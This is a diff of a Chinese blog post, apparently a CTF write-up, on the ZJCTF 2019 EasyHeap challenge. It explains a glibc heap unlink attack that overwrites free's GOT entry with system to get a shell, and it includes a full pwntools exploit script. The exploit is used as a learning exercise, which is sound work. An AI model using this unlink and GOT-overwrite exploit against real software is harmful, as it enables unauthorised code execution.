@@ -25,21 +25,21 @@
 <meta property="og:site_name" content="D0wnBe@t">
 <meta property="og:description" content="[ZJCTF_2019]EasyHeap-unlink题目链接  初次分析 刚开始ida一看，以为和之前的题目一样，就是简单的修改unsortedbin-&gt;bk，然后getflag 之前的题目讲解：[BUUCTF hitcontraining_magicheap–Unsorted_bin-＞bk修改]3-CSDN博客     l33r是个后门函数    正常打结果却显示：    所以被后门函">
 <meta property="og:locale" content="zh_CH">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901201439897.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901202058454.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901193853555.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901202849993.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901203630753.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901204855949.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901205436677.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901210431840.bmp">
-<meta property="og:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901210501273.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901201439897.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901202058454.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901193853555.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901202849993.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901203630753.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901204855949.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901205436677.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901210431840.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20240901210501273.bmp">
 <meta property="article:published_time" content="2024-09-01T12:11:11.000Z">
-<meta property="article:modified_time" content="2024-09-01T13:08:38.560Z">
+<meta property="article:modified_time" content="2024-11-06T05:10:04.398Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://downbeat.top/ZJCTF-2019-EasyHeap-unlink/capture_20240901201439897.bmp">
+<meta name="twitter:image" content="http://downbeat.top/capture_20240901201439897.bmp">
     
     
     <!--- Icon Part-->
@@ -246,8 +246,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-01 21:08:38</span>
-            <span class="mobile">2024-09-01 21:08:38</span>
+            <span class="desktop">2024-11-06 13:10:04</span>
+            <span class="mobile">2024-11-06 13:10:04</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -298,15 +298,15 @@
 <li>刚开始ida一看，以为和之前的题目一样，就是简单的修改unsortedbin-&gt;bk，然后getflag</li>
 <li>之前的题目讲解：[BUUCTF hitcontraining_magicheap–<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/zwb2603096342/article/details/140345550?spm=1001.2014.3001.5502">Unsorted_bin-＞bk修改]3-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901201439897.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901201439897.bmp"></p>
 <ul>
 <li><font size="4"><strong>l33r是个后门函数</strong></font></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901202058454.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202058454.bmp"></p>
 <ul>
 <li>正常打结果却显示：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901193853555.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901193853555.bmp"></p>
 <ul>
 <li><font size="4" color="red">所以被后门函数欺骗了！！！</font></li>
 </ul>
@@ -316,7 +316,7 @@
 <li>那么如何修改free_got，为了实现这个功能，我们通常有double_free控制同一个chunk，但是这里free后将指针清零了，所以无疑是不可以的，那么我们可以采取unlink，关于unlink可以参考<a class="link" target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#unlink_2">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
 <li>此题的PIE也没有开，且具有heaparray地址：</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901202849993.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901202849993.bmp"></p>
 <p><font size="4">常规的：</font></p>
 <ul>
 <li><font size="4"><strong>fd -&gt;  heaparray-0x18</strong></font></li>
@@ -329,7 +329,7 @@
 <li>先生成3个chunk，chunk2防止chunk1在free的时候与top_chunk合并，并且传入&#x2F;bin&#x2F;sh</li>
 <li>此时的堆布局如下</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901203630753.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901203630753.bmp"></p>
 <h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul>
 <li>unlink需要构造fake_chunk,然后uaf</li>
 <li><strong>利用chunk0构造一个fake_chunk:</strong></li>
@@ -339,11 +339,11 @@
 <ul>
 <li>此时堆布局如下，构造的fake_chunk和chunk1合并,红框部分地址应该是main_arena+0x58</li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901204855949.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901204855949.bmp"></p>
 <ul>
 <li><font size="4" color="red"><strong>查看heaparray</strong></font></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901205436677.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901205436677.bmp"></p>
 <p><font size="4" color="red"><strong>可以很明显的发现，修改chunk0，就是修改heaparray-0x18的值！！</strong></font></p>
 <h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul>
 <li>两个地方都可以修改chunk0，那么就可以先填入free_got,然后修改成system_plt，再free(2)即可：</li>
@@ -353,11 +353,11 @@
 <ul>
 <li><font size="4">第一次edit</font></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901210431840.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210431840.bmp"></p>
 <ul>
 <li><font size="4">第二次edit,发现成功修改了</font></li>
 </ul>
-<p><img lazyload src="/images/loading.svg" data-src="/ZJCTF-2019-EasyHeap-unlink/capture_20240901210501273.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901210501273.bmp"></p>
 <p><font size="4" color>注意：</font></p>
 <p>这里有点像非栈上格式化字符串漏洞一样了，先建立A -&gt; B -&gt;C的结构，然后修改A其实是修改C</p>
 <h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a><strong>完整EXP</strong></h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28478)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got -&gt; system_plt</span></span><br><span class="line">magic = <span class="number">0x6020C0</span> </span><br><span class="line">heaparray = <span class="number">0x6020E0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">bug()</span><br><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
@@ -378,7 +378,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-01 21:08:38
+                    :</strong> 2024-11-06 13:10:04
             </li>
         
         <li>
